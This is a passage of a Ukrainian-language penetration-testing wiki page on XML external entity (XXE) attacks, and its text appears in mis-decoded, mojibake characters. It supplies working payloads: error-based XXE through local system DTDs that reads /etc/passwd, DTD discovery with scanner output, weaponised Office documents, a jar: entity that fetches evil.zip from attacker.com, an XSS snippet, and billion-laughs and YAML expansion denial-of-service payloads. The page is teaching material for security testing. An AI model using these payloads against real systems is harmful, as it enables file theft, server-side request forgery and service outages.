–û—Ç–∂–µ, —â–æ —Ä–æ–±–∏—Ç–∏ –∑ —Å–ª—ñ–ø–∏–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ XXE, –∫–æ–ª–∏ **–≤–∑–∞—î–º–æ–¥—ñ—ó –ø–æ–∑–∞ –∫–∞–Ω–∞–ª–æ–º –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ** (–∑–æ–≤–Ω—ñ—à–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ñ)?

–õ–∞–∑—ñ–≤–∫–∞ –≤ —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –º–æ–≤–∏ XML –º–æ–∂–µ **–≤–∏–∫—Ä–∏—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ —á–µ—Ä–µ–∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏, –∫–æ–ª–∏ DTD –¥–æ–∫—É–º–µ–Ω—Ç–∞ –ø–æ—î–¥–Ω—É—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ –¥–µ–∫–ª–∞—Ä–∞—Ü—ñ—ó**. –¶—è –ø—Ä–æ–±–ª–µ–º–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—é –ø–µ—Ä–µ–∑–∞–ø–∏—Å —Å—É—Ç–Ω–æ—Å—Ç–µ–π, –æ–≥–æ–ª–æ—à–µ–Ω–∏—Ö –∑–æ–≤–Ω—ñ, —â–æ –ø–æ–ª–µ–≥—à—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫ XXE –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫. –¢–∞–∫—ñ –∞—Ç–∞–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å –ø–µ—Ä–µ–∑–∞–ø–∏—Å —Å—É—Ç–Ω–æ—Å—Ç—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ XML, —Å–ø–æ—á–∞—Ç–∫—É –æ–≥–æ–ª–æ—à–µ–Ω–æ–≥–æ –≤ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–º—É DTD, –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–≥–æ DTD. –ö–æ–ª–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è –ø–æ–∑–∞ –∫–∞–Ω–∞–ª–æ–º –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ —Å–µ—Ä–≤–µ—Ä–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–æ–∫–ª–∞–¥–∞—Ç–∏—Å—è –Ω–∞ –ª–æ–∫–∞–ª—å–Ω—ñ DTD —Ñ–∞–π–ª–∏ –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—è –∞—Ç–∞–∫–∏, –Ω–∞–º–∞–≥–∞—é—á–∏—Å—å –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É –ø–∞—Ä—Å–∏–Ω–≥—É, —â–æ–± —Ä–æ–∑–∫—Ä–∏—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–†–æ–∑–≥–ª—è–Ω—å—Ç–µ —Å—Ü–µ–Ω–∞—Ä—ñ–π, –¥–µ —Ñ–∞–π–ª–æ–≤–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä —Å–µ—Ä–≤–µ—Ä–∞ –º—ñ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª DTD –∑–∞ –∞–¥—Ä–µ—Å–æ—é `/usr/local/app/schema.dtd`, —â–æ –≤–∏–∑–Ω–∞—á–∞—î —Å—É—Ç–Ω—ñ—Å—Ç—å –∑ –Ω–∞–∑–≤–æ—é `custom_entity`. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É –ø–∞—Ä—Å–∏–Ω–≥—É XML, —Ä–æ–∑–∫—Ä–∏–≤–∞—é—á–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`, –ø–æ–¥–∞–≤—à–∏ –≥—ñ–±—Ä–∏–¥–Ω–∏–π DTD –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
–û–ø–∏—Å–∞–Ω—ñ –∫—Ä–æ–∫–∏ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è —Ü–∏–º DTD:

* –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ –∑ –Ω–∞–∑–≤–æ—é `local_dtd` –≤–∫–ª—é—á–∞—î –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD —Ñ–∞–π–ª, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –Ω–∞ —Ñ–∞–π–ª–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ —Å–µ—Ä–≤–µ—Ä–∞.
* –í—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ `custom_entity`, —Å–ø–æ—á–∞—Ç–∫—É –≤–∏–∑–Ω–∞—á–µ–Ω–æ—ó —É –∑–æ–≤–Ω—ñ—à–Ω—å–æ–º—É DTD, —â–æ–± —ñ–Ω–∫–∞–ø—Å—É–ª—é–≤–∞—Ç–∏ [–µ–∫—Å–ø–ª–æ–π—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–∫–∏ XXE](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). –¶–µ –ø–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–µ –¥–ª—è –≤–∏–∫–ª–∏–∫–∞–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏ –ø–∞—Ä—Å–∏–Ω–≥—É, —â–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`.
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å—É—Ç–Ω—ñ—Å—Ç—å `local_dtd`, –∑–∞–ª—É—á–∞—î—Ç—å—Å—è –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD, —â–æ –æ—Ö–æ–ø–ª—é—î –Ω–æ–≤–æ–≤–∏–∑–Ω–∞—á–µ–Ω—É `custom_entity`. –¶—è –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –¥—ñ–π –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–Ω–∏–∫–Ω–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, —è–∫–µ —î –º–µ—Ç–æ—é –µ–∫—Å–ø–ª–æ–π—Ç—É.

**–ü—Ä–∏–∫–ª–∞–¥ –∑ —Ä–µ–∞–ª—å–Ω–æ–≥–æ —Å–≤—ñ—Ç—É:** –°–∏—Å—Ç–µ–º–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ —Ä–æ–±–æ—á–æ–≥–æ —Å—Ç–æ–ª—É GNOME, —á–∞—Å—Ç–æ –º–∞—é—Ç—å DTD –∑–∞ –∞–¥—Ä–µ—Å–æ—é `/usr/share/yelp/dtd/docbookx.dtd`, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Å—É—Ç–Ω—ñ—Å—Ç—å –ø—ñ–¥ –Ω–∞–∑–≤–æ—é `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

–û—Å–∫—ñ–ª—å–∫–∏ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π DTD, –≤–∞–º —Å–ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω–∏–π**. –í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ, **–≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏** —Ç—É –∂ **–û–° / –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è**, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ—Ä–≤–µ—Ä, —ñ **—à—É–∫–∞—é—á–∏ –¥–µ—è–∫—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ DTD**, –∞–±–æ **–æ—Ç—Ä–∏–º–∞–≤—à–∏ —Å–ø–∏—Å–æ–∫** **—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö DTD** –≤ —Å–∏—Å—Ç–µ–º–∞—Ö —ñ **–ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏**, —á–∏ —ñ—Å–Ω—É—î —Ö–æ—á–∞ –± –æ–¥–∏–Ω –∑ –Ω–∏—Ö:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### –ü–æ—à—É–∫ DTD —É —Å–∏—Å—Ç–µ–º—ñ

–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —á—É–¥–æ–≤–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó –Ω–∞ github –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—à–ª—è—Ö–∏ DTD, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ–º–∏ –≤ —Å–∏—Å—Ç–µ–º—ñ**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —É –≤–∞—Å —î **Docker-–æ–±—Ä–∞–∑ –∂–µ—Ä—Ç–≤–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∑ —Ç–æ–≥–æ –∂ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é, —â–æ–± **—Å–∫–∞–Ω—É–≤–∞—Ç–∏** **–æ–±—Ä–∞–∑** —ñ **–∑–Ω–∞–π—Ç–∏** —à–ª—è—Ö –¥–æ **DTD**, —â–æ –ø—Ä–∏—Å—É—Ç–Ω—ñ –≤ —Å–∏—Å—Ç–µ–º—ñ. –ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ [Readme —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é –Ω–∞ github](https://github.com/GoSecure/dtd-finder), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —è–∫.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE —á–µ—Ä–µ–∑ –ø–∞—Ä—Å–µ—Ä–∏ Office Open XML

–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ü—ñ—î—ó –∞—Ç–∞–∫–∏, **–ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –¥—Ä—É–≥–∏–π —Ä–æ–∑–¥—ñ–ª** [**—Ü—å–æ–≥–æ —á—É–¥–æ–≤–æ–≥–æ –ø–æ—Å—Ç—É**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **–≤—ñ–¥ Detectify**.

–ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∏ Microsoft Office –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è –±–∞–≥–∞—Ç—å–º–∞ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞–º–∏**, —è–∫—ñ –ø–æ—Ç—ñ–º –ø—Ä–æ–¥–æ–≤–∂—É—é—Ç—å –≤–∏—Ç—è–≥—É–≤–∞—Ç–∏ –ø–µ–≤–Ω—ñ –¥–µ—Ç–∞–ª—ñ –∑ —Ü–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º —ñ–º–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É —Ç–∞–±–ª–∏—Ü—é —É —Ñ–æ—Ä–º–∞—Ç—ñ XLSX. –©–æ–± –ø–∞—Ä—Å–µ—Ä –∑–º—ñ–≥ –≤–∏—Ç—è–≥—Ç–∏ –¥–∞–Ω—ñ –∑ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ, –π–æ–º—É –Ω–µ–º–∏–Ω—É—á–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ —Ä–æ–∑–ø–∞—Ä—Å–∏—Ç–∏ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –æ–¥–∏–Ω XML —Ñ–∞–π–ª.

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Ñ–∞–π–ª Microsoft Office, —â–æ –º—ñ—Å—Ç–∏—Ç—å XXE payload**. –ü–µ—Ä—à–∏–º –∫—Ä–æ–∫–æ–º —î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–æ—Ä–æ–∂–Ω—å–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, –≤ —è–∫—É –¥–æ–∫—É–º–µ–Ω—Ç –º–æ–∂–µ –±—É—Ç–∏ —Ä–æ–∑–ø–∞–∫–æ–≤–∞–Ω–∏–π.

–ü—ñ—Å–ª—è —Ä–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞, XML —Ñ–∞–π–ª, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é `./unzipped/word/document.xml`, —Å–ª—ñ–¥ –≤—ñ–¥–∫—Ä–∏—Ç–∏ —Ç–∞ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —É –≤–∏–±—Ä–∞–Ω–æ–º—É —Ç–µ–∫—Å—Ç–æ–≤–æ–º—É —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, vim). XML —Å–ª—ñ–¥ –∑–º—ñ–Ω–∏—Ç–∏, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ –±–∞–∂–∞–Ω–∏–π XXE payload, —á–∞—Å—Ç–æ –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ HTTP –∑–∞–ø–∏—Ç—É.

–ó–º—ñ–Ω–µ–Ω—ñ XML —Ä—è–¥–∫–∏ —Å–ª—ñ–¥ –≤—Å—Ç–∞–≤–∏—Ç–∏ –º—ñ–∂ –¥–≤–æ–º–∞ –∫–æ—Ä–µ–Ω–µ–≤–∏–º–∏ XML –æ–±'—î–∫—Ç–∞–º–∏. –í–∞–∂–ª–∏–≤–æ –∑–∞–º—ñ–Ω–∏—Ç–∏ URL –Ω–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥–æ–≤–∏–π URL –¥–ª—è –∑–∞–ø–∏—Ç—ñ–≤.

–ù–∞—Ä–µ—à—Ç—ñ, —Ñ–∞–π–ª –º–æ–∂–Ω–∞ –∑–Ω–æ–≤—É —Å—Ç–∏—Å–Ω—É—Ç–∏, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π poc.docx —Ñ–∞–π–ª. –ó —Ä–∞–Ω—ñ—à–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó "unzipped" —Å–ª—ñ–¥ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:

–¢–µ–ø–µ—Ä —Å—Ç–≤–æ—Ä–µ–Ω–∏–π —Ñ–∞–π–ª –º–æ–∂–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –≤–µ–±-–¥–æ–¥–∞—Ç–∫—É, —ñ –º–æ–∂–Ω–∞ —Å–ø–æ–¥—ñ–≤–∞—Ç–∏—Å—è –Ω–∞ –ø–æ—è–≤—É –∑–∞–ø–∏—Ç—É –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö Burp Collaborator.

### Jar: –ø—Ä–æ—Ç–æ–∫–æ–ª

–ü—Ä–æ—Ç–æ–∫–æ–ª **jar** –¥–æ—Å—Ç—É–ø–Ω–∏–π –≤–∏–∫–ª—é—á–Ω–æ –≤ **Java –¥–æ–¥–∞—Ç–∫–∞—Ö**. –í—ñ–Ω –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—ñ–≤ —É **PKZIP** –∞—Ä—Ö—ñ–≤—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `.zip`, `.jar` —Ç–æ—â–æ), —â–æ –æ—Ö–æ–ø–ª—é—î —è–∫ –ª–æ–∫–∞–ª—å–Ω—ñ, —Ç–∞–∫ —ñ –≤—ñ–¥–¥–∞–ª–µ–Ω—ñ —Ñ–∞–π–ª–∏.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
–©–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ PKZIP —Ñ–∞–π–ª—ñ–≤, —Ü–µ **–Ω–∞–¥–∑–≤–∏—á–∞–π–Ω–æ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è XXE —á–µ—Ä–µ–∑ —Å–∏—Å—Ç–µ–º–Ω—ñ DTD —Ñ–∞–π–ª–∏.** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [—Ü–µ–π —Ä–æ–∑–¥—ñ–ª, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω–∏–º–∏ DTD —Ñ–∞–π–ª–∞–º–∏](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

–ü—Ä–æ—Ü–µ—Å –¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—É –≤ –∞—Ä—Ö—ñ–≤—ñ PKZIP —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ–∫–æ–ª jar –≤–∫–ª—é—á–∞—î –∫—ñ–ª—å–∫–∞ –µ—Ç–∞–ø—ñ–≤:

1. –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è HTTP-–∑–∞–ø–∏—Ç –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è zip-–∞—Ä—Ö—ñ–≤—É –∑ –≤–∫–∞–∑–∞–Ω–æ–≥–æ –º—ñ—Å—Ü—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `https://download.website.com/archive.zip`.
2. HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—å, —â–æ –º—ñ—Å—Ç–∏—Ç—å –∞—Ä—Ö—ñ–≤, —Ç–∏–º—á–∞—Å–æ–≤–æ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ —Å–∏—Å—Ç–µ–º—ñ, –∑–∞–∑–≤–∏—á–∞–π —É –º—ñ—Å—Ü—ñ –Ω–∞ –∫—à—Ç–∞–ª—Ç `/tmp/...`.
3. –ê—Ä—Ö—ñ–≤ –ø–æ—Ç—ñ–º —Ä–æ–∑–ø–∞–∫–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –π–æ–≥–æ –≤–º—ñ—Å—Ç—É.
4. –ß–∏—Ç–∞—î—Ç—å—Å—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Ñ–∞–π–ª –≤ –∞—Ä—Ö—ñ–≤—ñ, `file.zip`.
5. –ü—ñ—Å–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –æ–ø–µ—Ä–∞—Ü—ñ—ó –±—É–¥—å-—è–∫—ñ —Ç–∏–º—á–∞—Å–æ–≤—ñ —Ñ–∞–π–ª–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –ø—ñ–¥ —á–∞—Å —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É, –≤–∏–¥–∞–ª—è—é—Ç—å—Å—è.

–¶—ñ–∫–∞–≤–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è –ø–µ—Ä–µ—Ä–∏–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–∞ –¥—Ä—É–≥–æ–º—É –µ—Ç–∞–ø—ñ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ —Å–µ—Ä–≤–µ—Ä–æ–º –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –±–µ–∑–∫—ñ–Ω–µ—á–Ω–æ –ø—ñ–¥ —á–∞—Å –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è –∞—Ä—Ö—ñ–≤–Ω–æ–≥–æ —Ñ–∞–π–ª—É. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –¥–æ—Å—Ç—É–ø–Ω—ñ –≤ [—Ü—å–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution), –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏, –≤–∫–ª—é—á–∞—é—á–∏ Python-—Å–µ—Ä–≤–µ—Ä (`slow_http_server.py`) —Ç–∞ Java-—Å–µ—Ä–≤–µ—Ä (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
–ó–∞–ø–∏—Å —Ñ–∞–π–ª—ñ–≤ —É —Ç–∏–º—á–∞—Å–æ–≤–∏–π –∫–∞—Ç–∞–ª–æ–≥ –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ **–µ—Å–∫–∞–ª–∞—Ü—ñ—ó —ñ–Ω—à–æ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —â–æ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –æ–±—Ö–æ–¥—É —à–ª—è—Ö—É** (—Ç–∞–∫–æ—ó —è–∫ –ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —ñ–Ω'—î–∫—Ü—ñ—è —à–∞–±–ª–æ–Ω—ñ–≤, XSLT RCE, –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è —Ç–æ—â–æ).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### –ê—Ç–∞–∫–∞ –º—ñ–ª—å–π–æ–Ω–∞ —Å–º—ñ—Ö—ñ–≤
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### –ê—Ç–∞–∫–∞ Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### –ê—Ç–∞–∫–∞ –∫–≤–∞–¥—Ä–∞—Ç–∏—á–Ω–æ–≥–æ –≤–∏–±—É—Ö—É

![](<../.gitbook/assets/image (527).png>)

#### –û—Ç—Ä–∏–º–∞–Ω–Ω—è NTML

